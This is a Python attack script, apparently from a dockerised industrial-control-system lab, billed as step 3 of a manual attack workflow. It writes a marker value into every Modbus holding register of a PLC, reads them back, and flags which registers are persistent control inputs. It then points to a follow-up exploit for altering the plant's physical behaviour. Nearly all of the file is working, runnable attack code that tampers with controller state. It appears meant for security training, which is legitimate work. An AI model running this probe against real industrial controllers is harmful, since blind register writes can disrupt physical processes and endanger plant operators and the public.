"""
Step 3 of the manual attack workflow: figure out which register(s) are
actually writable control inputs, versus which ones just reflect
sensor/computed values and get overwritten by the PLC's own control
loop every tick.

Technique: write a distinctive test value into EVERY register, wait a
couple of seconds, then read them all back.
  - A register whose value reverts to something close to what it was
    before is being driven by the PLC's own logic every tick —
    writing to it has no lasting effect.
  - A register whose value STAYS at what we wrote is not being
    refreshed by the PLC at all — that's a real, persistent control
    input.

This is a genuinely realistic ICS reconnaissance technique: without
any documentation, an attacker can distinguish sensor/telemetry
registers from control registers purely by observing which writes
"stick" versus which get silently overwritten.

Usage:
    docker compose exec attacker python3 tools/modbus_probe_writable.py <host> [port]
"""

import sys
import time
from pymodbus.client import ModbusTcpClient

REGISTER_COUNT_TO_PROBE = 7
TEST_MARKER_VALUE = 4242  # distinctive, unlikely to occur naturally
SETTLE_SECONDS = 2


def main() -> None:
    if len(sys.argv) < 2:
        print("Usage: python3 modbus_probe_writable.py <host> [port]")
        sys.exit(1)

    host = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 5020

    client = ModbusTcpClient(host, port=port)
    if not client.connect():
        print(f"Could not connect to {host}:{port}")
        sys.exit(1)

    print(f"[probe] Reading baseline values for registers 0-{REGISTER_COUNT_TO_PROBE - 1}...")
    before = client.read_holding_registers(
        address=0, count=REGISTER_COUNT_TO_PROBE, slave=1
    ).registers
    for i, v in enumerate(before):
        print(f"  register[{i}] baseline = {v}")

    print(f"\n[probe] Writing marker value {TEST_MARKER_VALUE} to every register...")
    for i in range(REGISTER_COUNT_TO_PROBE):
        client.write_register(address=i, value=TEST_MARKER_VALUE, slave=1)

    print(f"[probe] Waiting {SETTLE_SECONDS}s for the PLC's control loop to run at least once...")
    time.sleep(SETTLE_SECONDS)

    after = client.read_holding_registers(
        address=0, count=REGISTER_COUNT_TO_PROBE, slave=1
    ).registers

    print("\n[probe] Results:")
    print(f"  {'reg':<5}{'before':<10}{'wrote':<10}{'after':<10}{'verdict'}")
    persistent_registers = []
    for i in range(REGISTER_COUNT_TO_PROBE):
        stuck = (after[i] == TEST_MARKER_VALUE)
        verdict = "PERSISTENT (control candidate)" if stuck else "overwritten by PLC (sensor/computed)"
        if stuck:
            persistent_registers.append(i)
        print(f"  {i:<5}{before[i]:<10}{TEST_MARKER_VALUE:<10}{after[i]:<10}{verdict}")

    print(f"\n[probe] Likely control register(s): {persistent_registers}")
    print("[probe] Next: write a meaningful value to a persistent register")
    print("[probe] and watch whether it changes the plant's physical behavior")
    print("[probe] (see exploit_gate.py).")

    client.close()


if __name__ == "__main__":
    main()